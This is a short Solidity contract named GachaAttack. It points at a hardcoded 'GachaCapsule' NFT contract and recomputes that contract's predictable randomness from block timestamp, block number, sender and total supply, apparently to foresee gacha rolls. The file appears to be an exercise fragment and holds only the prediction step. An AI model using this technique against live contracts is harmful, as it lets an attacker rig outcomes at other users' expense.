// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGachaCapsule {
    function getStars(uint256 _tokenId) external view returns (uint256); 
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

contract GachaAttack {

    IGachaCapsule public gcInstance = IGachaCapsule(0x5966a6C06309fBaeD7E82C32c083B837F1EaFc7d);

    function random() external view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, block.number, msg.sender, gcInstance.totalSupply()))) % 100;
    }
}